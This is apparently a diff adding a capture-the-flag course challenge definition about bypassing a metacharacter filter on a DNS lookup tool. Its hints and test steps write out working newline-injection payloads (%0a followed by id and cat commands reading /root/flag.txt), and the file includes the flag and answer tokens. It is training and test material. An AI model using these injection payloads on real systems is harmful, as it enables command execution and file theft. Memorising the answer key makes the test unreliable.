@@ -1,0 +1,98 @@
+name: "TrueNorth Hosting - Filtered Injection"
+description: "TrueNorth Hosting's DNS lookup tool filters common shell metacharacters but misses newline injection. Bypass the filter using URL-encoded newlines to execute arbitrary commands and recover the flag."
+
+difficulty: intermediate
+category: web
+duration_minutes: 45
+randomize_ip_offsets: true
+visibility: course
+week: 6
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/22_Filtered_Injection/"
+flag: "OCR{f1lt3r_byp4ss_pwn3d}"
+
+objectives:
+  - Identify a web application that filters user input before passing it to a system command
+  - Discover which shell metacharacters are blocked and which are not
+  - Bypass the input filter using newline injection via URL encoding (%0a)
+  - Execute arbitrary commands to locate hidden files on the server
+  - Assemble both tokens to capture the flag
+
+scenario: |
+  TrueNorth Hosting provides managed DNS and hosting services for small businesses.
+  Their customer portal includes a DNS lookup tool that lets users check domain
+  records directly from the browser.
+
+  After a previous security audit flagged command injection risks, the development
+  team added input filtering to strip dangerous characters: semicolons, pipes, and
+  ampersands. They believe the tool is now safe.
+
+  Sarah Chen (Senior Developer): "We strip all the classic shell metacharacters
+  before the input hits the command. Semicolons, pipes, ampersands - they're all
+  gone. There's no way to chain commands now."
+
+  Your assessment scope covers the DNS lookup tool and the underlying server.
+  Two tokens have been placed on the system - find them both and assemble the flag.
+
+credentials: []
+
+hints:
+  - text: |
+      Try the DNS lookup tool normally first with a domain like example.com.
+      Then try classic injection characters: semicolons (;), pipes (|), and
+      ampersands (&). Notice they are all stripped. But there are other ways
+      to separate commands in a shell - what about newline characters?
+    unlock_after_minutes: 15
+  - text: |
+      The filter misses URL-encoded newlines. Try submitting a request where
+      the domain parameter contains %0a followed by a command. For example,
+      use curl or Burp Suite to send: domain=example.com%0aid
+      If you see uid output, the injection works. Now explore the filesystem.
+    unlock_after_minutes: 25
+  - text: |
+      Use newline injection to list directories. Look under /opt/truenorth/
+      for a hidden configuration directory containing the first token. The
+      second token is in a common flag location. Assemble them in the format
+      OCR{token1_token2}.
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "TrueNorth Server"
+      type: "server"
+      ip_offset: "22"
+      ports: [80]
+      services: ["Flask"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "Web application responds"
+      command: "curl -s http://{target.webapp}/ | grep -ci 'truenorth' | awk '{print ($1>=1)?\"ok\":\"none\"}'"
+      expect: "ok"
+
+    - name: "Normal DNS lookup works"
+      command: "curl -s -d 'domain=example.com' http://{target.webapp}/lookup | grep -c 'Server'"
+      expect: "1"
+
+    - name: "Newline injection executes id"
+      command: "curl -s -d 'domain=example.com%0aid' http://{target.webapp}/lookup | grep -c 'uid'"
+      expect: "1"
+
+    - name: "Extract token 1 via newline injection"
+      command: "curl -s -d 'domain=example.com%0acat /opt/truenorth/hidden_config/token1.txt' http://{target.webapp}/lookup | grep -oE 'f1lt3r_byp4ss' | head -1"
+      expect: "f1lt3r_byp4ss"
+
+    - name: "Extract token 2 via newline injection"
+      command: "curl -s -d 'domain=example.com%0acat /root/flag.txt' http://{target.webapp}/lookup | grep -oE 'pwn3d' | head -1"
+      expect: "pwn3d"
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{f1lt3r_byp4ss_pwn3d}'"
+      expect: "OCR{"
